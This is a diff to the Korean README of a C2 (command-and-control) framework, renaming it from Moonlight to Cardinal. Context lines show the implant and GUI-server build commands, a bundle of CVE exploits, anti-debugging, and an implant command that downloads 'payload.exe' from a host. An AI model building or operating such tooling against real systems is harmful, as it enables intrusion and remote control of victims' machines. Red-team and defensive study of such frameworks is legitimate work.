@@ -1,4 +1,4 @@
-# Moonlight C2 Framework v3.0 - Pure C + GUI Edition
+# Cardinal C2 Framework v3.0 - Pure C + GUI Edition
 
 <div align="center">
 
@@ -43,7 +43,7 @@
 ## 📋 아키텍처 (v3.0)
 
 ```
-Moonlight C2 Framework v3.0
+Cardinal C2 Framework v3.0
 │
 ├── 클라이언트 (Pure C)
 │   ├── implant.c          # 메인 임플란트
@@ -56,7 +56,7 @@ Moonlight C2 Framework v3.0
 │   └── gui_server_functions.c  # GUI 기능 구현 (NEW!)
 │
 ├── 공통
-│   └── moonlight.h        # 통합 헤더 파일
+│   └── Cardinal.h        # 통합 헤더 파일
 │
 └── Exploits
     └── [38+ CVE exploits]
@@ -102,13 +102,13 @@ cd client
 gcc -c stealth.c -o build/stealth.o -O2
 gcc -c network.c -o build/network.o -O2
 gcc -c implant.c -o build/implant.o -O2
-gcc build/*.o -o build/moonlight-implant.exe -lws2_32 -ladvapi32 -s
+gcc build/*.o -o build/Cardinal-implant.exe -lws2_32 -ladvapi32 -s
 
 # GUI 서버 빌드
 cd server
 gcc -c gui_server.c -o build/gui_server.o -mwindows
 gcc -c gui_server_functions.c -o build/gui_server_functions.o
-gcc build/*.o -o build/moonlight-gui-server.exe -lws2_32 -lcomctl32 -lgdi32 -mwindows -s
+gcc build/*.o -o build/Cardinal-gui-server.exe -lws2_32 -lcomctl32 -lgdi32 -mwindows -s
 ```
 
 ---
@@ -118,7 +118,7 @@ gcc build/*.o -o build/moonlight-gui-server.exe -lws2_32 -lcomctl32 -lgdi32 -mwi
 ### 실행
 
 ```powershell
-.\bin\moonlight-gui-server.exe
+.\bin\Cardinal-gui-server.exe
 ```
 
 ### 주요 기능
@@ -209,7 +209,7 @@ download http://192.168.1.100/payload.exe
 ### 메인 윈도우
 ```
 ┌─────────────────────────────────────────────────────────────┐
-│ ∴ Moonlight C2 Framework ∴ [HACKER MODE]                   │
+│ ∴ Cardinal C2 Framework ∴ [HACKER MODE]                   │
 ├─────────────────────────────────────────────────────────────┤
 │ [Start Server] [Stop Server] | [Refresh] [Screenshot]      │
 ├─────────────────────────────────────────────────────────────┤
@@ -291,7 +291,7 @@ int check_debugger();
 - ✅ 해커 테마 GUI 서버 추가
 - ✅ 실시간 세션 관리 및 모니터링
 - ✅ One-click exploit 실행
-- ✅ 통합 헤더 파일 (moonlight.h)
+- ✅ 통합 헤더 파일 (Cardinal.h)
 - ✅ 새로운 빌드 시스템
 
 ### v2.0 - Assembly Enhanced
@@ -309,7 +309,7 @@ int check_debugger();
 
 **⚠️ 항상 적절한 승인을 받으세요! ⚠️**
 
-**Moonlight C2 Framework v3.0**  
+**Cardinal C2 Framework v3.0**  
 Pure C Implementation + Hacker GUI
 
 ---
